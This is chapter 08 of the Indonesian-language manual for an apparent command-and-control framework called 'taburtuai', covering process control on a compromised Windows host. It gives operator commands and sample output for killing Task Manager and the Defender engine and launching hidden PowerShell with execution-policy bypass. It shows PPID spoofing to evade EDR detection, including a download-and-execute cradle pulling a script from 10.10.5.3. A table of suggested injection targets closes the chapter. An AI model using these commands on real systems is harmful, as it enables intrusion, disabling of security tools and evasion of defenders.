# 08 — Process Management

## List Proses

Tampilkan semua proses yang berjalan di target beserta informasi PID, parent, user, dan memory.

```
taburtuai(IP:8000) › process list 2703886d
```

**Output:**
```
[+] Process list for DESKTOP-QLPBF95 (2703886d):

PID    PPID   NAME                         USERNAME              MEM (MB)
-----  -----  ---------------------------  --------------------  --------
4      0      System                       SYSTEM                0.1
88     4      Registry                     SYSTEM                47.2
456    4      smss.exe                     SYSTEM                0.4
580    572    csrss.exe                    SYSTEM                4.2
648    640    winlogon.exe                 SYSTEM                5.3
724    620    lsass.exe                    SYSTEM                12.4
868    804    svchost.exe                  SYSTEM                14.2
976    804    svchost.exe                  NETWORK SERVICE       8.1
1024   804    svchost.exe                  LOCAL SERVICE         6.5
1248   804    MsMpEng.exe                  SYSTEM                156.3
2048   804    spoolsv.exe                  SYSTEM                9.7
3048   3016   explorer.exe                 john.doe              82.4
3124   3048   chrome.exe                   john.doe              245.6
3456   3048   OneDrive.exe                 john.doe              34.2
3788   3048   Taskmgr.exe                  john.doe              18.9
4512   3048   agent_windows_stealth.exe    john.doe              8.2
```

### Filter Berdasarkan Nama

```
taburtuai(IP:8000) › process list 2703886d --filter lsass
```

**Output:**
```
PID    PPID   NAME       USERNAME   MEM (MB)
724    620    lsass.exe  SYSTEM     12.4
```

### Format JSON untuk Parsing

```
taburtuai(IP:8000) › process list 2703886d --format json
```

**Output:**
```json
[
  {
    "pid": 724,
    "ppid": 620,
    "name": "lsass.exe",
    "username": "SYSTEM",
    "mem_mb": 12.4,
    "path": "C:\\Windows\\System32\\lsass.exe"
  },
  ...
]
```

---

## Kill Proses

Terminate proses berdasarkan PID.

```
taburtuai(IP:8000) › process kill 2703886d --pid 3788 --wait
```

**Output:**
```
[*] Terminating process PID 3788 (Taskmgr.exe)...
[+] Process 3788 terminated.
```

### Kill AV/EDR Process (Butuh Privilege yang Tepat)

```
# Cari PID antivirus
taburtuai(IP:8000) › process list 2703886d --filter MsMpEng

# Kill
taburtuai(IP:8000) › process kill 2703886d --pid 1248 --wait
```

**Output (gagal karena protected process):**
```
[!] Failed to terminate PID 1248: Access is denied.
[i] MsMpEng.exe adalah Protected Process Light (PPL) — tidak bisa di-kill langsung.
[i] Gunakan token escalation atau PPL bypass terlebih dahulu.
```

**Output (berhasil setelah escalate):**
```
[+] Process 1248 terminated.
```

---

## Start Proses

Jalankan proses baru di target.

```
taburtuai(IP:8000) › process start 2703886d \
  --path "C:\Windows\System32\cmd.exe" \
  --args "/c whoami > C:\Temp\out.txt" \
  --hidden \
  --wait
```

**Output:**
```
[*] Starting process: C:\Windows\System32\cmd.exe /c whoami > C:\Temp\out.txt
[+] Process started (PID: 6720)
```

### Start PowerShell Tersembunyi

```
taburtuai(IP:8000) › process start 2703886d \
  --path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
  --args "-w hidden -ep bypass -f C:\Users\Public\enum.ps1" \
  --hidden \
  --wait
```

**Output:**
```
[+] Process started (PID: 7832) — running in background
```

---

## PPID Spoofing — Spawn Proses dengan Parent Palsu

Buat proses dengan parent process yang berbeda untuk menghindari deteksi berbasis
process tree. EDR sering menganalisis parent-child chain untuk deteksi.

### Tanpa Spoofing (Mudah Dideteksi)

```
agent.exe (PID 4512, john.doe)
  └─► cmd.exe (PID 6720)     ← ALERT: cmd lahir dari agent yang tidak dikenal
        └─► powershell.exe
```

### Dengan PPID Spoofing

```
explorer.exe (PID 3048, john.doe)
  └─► cmd.exe (PID 6720)     ← Normal: cmd lahir dari explorer seperti biasa
        └─► powershell.exe
```

### Spawn dengan Parent explorer.exe

```
taburtuai(IP:8000) › inject ppid 2703886d \
  --exe "C:\Windows\System32\cmd.exe" \
  --ppid-name explorer.exe \
  --wait
```

**Output:**
```
[*] Finding PID for explorer.exe...
[*] Found: PID 3048 (explorer.exe, john.doe)
[*] Spawning cmd.exe with PPID=3048...
[+] Process started: cmd.exe (PID: 6720) | Parent: explorer.exe (3048)
```

### Spawn PowerShell Tersembunyi dengan Parent svchost

```
taburtuai(IP:8000) › inject ppid 2703886d \
  --exe "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
  --args "-w hidden -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.5.3/script.ps1')" \
  --ppid-name svchost.exe \
  --wait
```

**Output:**
```
[*] Spoofing parent to svchost.exe (PID: 976)...
[+] powershell.exe (PID: 8924) spawned under svchost.exe (PID: 976)
```

### Spawn dengan PID Langsung

```
# Pakai PID spesifik, bukan nama
taburtuai(IP:8000) › inject ppid 2703886d \
  --exe "C:\Windows\System32\calc.exe" \
  --ppid 3048 \
  --wait
```

---

## Skenario: Enumeration Proses untuk Injection Target

Sebelum injection, identifikasi proses yang cocok:

```
taburtuai(IP:8000) › process list 2703886d
```

Cari proses yang:
1. **Stabil** — tidak sering ditutup user (explorer.exe, svchost.exe, RuntimeBroker.exe)
2. **Privilege sesuai** — sama atau lebih tinggi dari yang dibutuhkan
3. **Tidak ter-monitor** — bukan MsMpEng.exe, tidak dikaitkan langsung ke aktivitas mencurigakan

**Proses rekomendasi injection:**

| Proses | Keterangan |
|--------|------------|
| `explorer.exe` | Selalu ada, user context, stabil |
| `RuntimeBroker.exe` | Microsoft trusted, medium integrity |
| `svchost.exe` | Banyak instance, sulit dianalisis |
| `spoolsv.exe` | SYSTEM context, selalu berjalan |
| `dllhost.exe` | COM surrogate, sering spawned normal |

---

**Selanjutnya:** [09 — Stager & Delivery](09-stager.md)
